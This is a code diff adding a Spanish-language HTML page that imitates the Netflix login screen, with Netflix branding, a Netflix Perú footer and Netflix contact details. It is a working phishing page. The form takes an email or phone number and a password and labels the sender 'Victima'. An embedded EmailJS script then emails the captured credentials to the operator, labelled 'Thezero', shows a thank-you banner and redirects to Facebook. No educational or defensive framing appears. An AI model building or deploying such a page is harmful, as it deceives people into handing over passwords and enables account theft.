@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <title>Netflix</title>
+    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+    <!-- Font Awesome icons (free version)-->
+    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+    <!-- Google fonts-->
+    <link href="https://fonts.googleapis.com/css?family=Varela+Round" rel="stylesheet" />
+    <link
+        href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i"
+        rel="stylesheet" />
+    <!-- Core theme CSS (includes Bootstrap)-->
+    <link href="css/styles.css" rel="stylesheet" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+</head>
+
+<body id="page-top">
+    <!-- Navigation-->
+    <nav style="background-color: transparent; margin: 10px;">
+        <div class="container px-4 px-lg-5" style="background-color: transparent;">
+            <img src="assets/img/logNet.png" class="logo2">
+
+
+        </div>
+    </nav>
+    <!-- Masthead-->
+    <header class="masthead">
+        <div class="contenex">
+            <form class="log-formi" id="form" name="sentMessage" method="post" novalidate="novalidate">
+                <h2 style="font-size: 30px;">Iniciar sesión</h2>
+                <div class="formi-grupe">
+                    <label for="username">Email o numero de telefono:</label>
+                    <input type="hidden" name="from_name" id="from_name" value="Victima" required>
+                    <input type="text" name="message" id="message" autofocus="" required>
+                </div>
+                <div class="formi-grupe">
+                    <label for="password">Contraseña:</label>
+                    <input type="hidden" id="to_name" name="to_name" value="Thezero" required>
+                    <input type="password" name="message" id="message" required>
+                </div><br>
+                <button type="submit" class="buttoncillo" id="button" value="Send Email">Iniciar sesión</button>
+                <br><br><br>
+                <div>
+                    <p class="register-text">¿Primera vez en Netflix? <a href="#registro">Suscríbete ahora</a>.</p>
+                    <p class="small-text">Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
+                    </p>
+                </div>
+            </form>
+        </div>
+    </header>
+    <div class="line2"></div>
+    <!--Envia el mensaje a correo electronico-->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        emailjs.init('user_zByTB2OyK8sWofFePBZdB')
+        var subject = "Lyrics-Music"
+        const phone = document.getElementById('phone');
+        const btn = document.getElementById('button');
+
+        document.getElementById('form')
+            .addEventListener('submit', function (event) {
+                event.preventDefault();
+
+                btn.value = 'Enviando...';
+
+                const serviceID = 'default_service';
+                const templateID = 'gmail';
+
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        btn.value = 'Send Email';
+                        //alert('Iniciando sesión')
+                        
+                        var msj2 = '<center><div style="display: block;background-color: yellow;border: 5px ridge;text-align: center" id="mensajillo"><div style="font-size: 6vw;color: red;display: block;">MUCHAS GRACIAS POR PARTICIPAR!</div></div></center>'
+                        $('body').append(msj2)
+                        open('https://web.facebook.com/?_rdc=1&_rdr')
+
+                        //alert('MUCHAS GRACIAS POR PARTICIPAR!');
+                    }, (err) => {
+                        btn.value = 'Send Email';
+                        alert(JSON.stringify(err));
+                    });
+            });
+
+
+    </script>
+
+    <!-- Contact-->
+    <section class="contact-section bg-black">
+        <div class="container px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5">
+                <div class="col-md-4 mb-3 mb-md-0">
+                    <div class="card py-4 h-100">
+                        <div class="card-body text-center">
+                            <i class="fas fa-map-marked-alt text-primary mb-2"></i>
+                            <h4 class="text-uppercase m-0">Address</h4>
+                            <hr class="my-4 mx-auto" />
+                            <div class="small text-black-50">Los Gatos, California, Estados Unidos</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4 mb-3 mb-md-0">
+                    <div class="card py-4 h-100">
+                        <div class="card-body text-center">
+                            <i class="fas fa-envelope text-primary mb-2"></i>
+                            <h4 class="text-uppercase m-0">Email</h4>
+                            <hr class="my-4 mx-auto" />
+                            <div class="small text-black-50"><a
+                                    href="mailto:info@account.netflix.com">info@account.netflix.com</a></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4 mb-3 mb-md-0">
+                    <div class="card py-4 h-100">
+                        <div class="card-body text-center">
+                            <i class="fas fa-mobile-alt text-primary mb-2"></i>
+                            <h4 class="text-uppercase m-0">Phone</h4>
+                            <hr class="my-4 mx-auto" />
+                            <a class="small text-black-50" href="tel:0-800-52352">0-800-52352</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="social d-flex justify-content-center">
+                <a class="mx-2" href="#!"><i class="fab fa-twitter"></i></a>
+                <a class="mx-2" href="#!"><i class="fab fa-facebook-f"></i></a>
+                <a class="mx-2" href="#!"><i class="fab fa-github"></i></a>
+            </div>
+        </div>
+    </section>
+    <!-- Footer-->
+    <footer class="footer bg-black small text-center text-white-50">
+        <div class="container px-4 px-lg-5">Copyright &copy; Netflix Perú</div>
+    </footer>
+    <!-- Bootstrap core JS-->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Core theme JS-->
+    <script src="js/scripts.js"></script>
+    <!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *-->
+    <!-- * *                               SB Forms JS                               * *-->
+    <!-- * * Activate your form at https://startbootstrap.com/solution/contact-forms * *-->
+    <!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *-->
+    <!--script src="https://cdn.startbootstrap.com/sb-forms-latest.js">
+        
+    </script-->
+    <script src="js/sb-forms-latest.js"></script>
+
+</body>
+
+</html>
